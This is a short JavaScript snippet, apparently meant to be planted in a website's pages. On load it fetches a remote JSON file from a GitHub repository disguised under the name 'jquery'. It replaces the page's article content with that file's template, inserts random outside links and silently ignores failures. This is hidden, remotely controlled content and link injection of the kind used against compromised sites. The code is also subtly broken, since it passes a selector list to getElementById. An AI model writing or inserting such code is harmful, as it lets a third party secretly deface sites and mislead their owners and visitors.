(function (w, d) {

  function ready(fn){
    if (d.readyState !== "loading") fn();
    else d.addEventListener("DOMContentLoaded", fn);
  }

  function inject(data){
    var el = d.getElementById('.entry-content, article, .elementor-widget-container');
    if (!el || !data || !data.template) return;

    var blocks = data.template.slice();
    var max = data.config && data.config.maxAnchors ? data.config.maxAnchors : 1;

    var anchors = data.anchors.slice().sort(function(){
      return 0.5 - Math.random();
    }).slice(0, max);

    var step = Math.floor(blocks.length / (anchors.length + 1));

    for (var i = 0; i < anchors.length; i++) {
      var a = anchors[i];
      var link = '<a href="'+a.url+'" rel="nofollow noopener">'+a.text+'</a>';
      var pos = step * (i + 1);
      blocks[pos] = blocks[pos].replace(".", " " + link + ".");
    }

    el.innerHTML = blocks.join("");
  }

  ready(function(){
    fetch("https://cdn.jsdelivr.net/gh/nanangkus/jquery@refs/heads/main/store.json", {
      cache: "no-store"
    })
    .then(function(r){ return r.json(); })
    .then(inject)
    .catch(function(){});
  });

})(window, document);
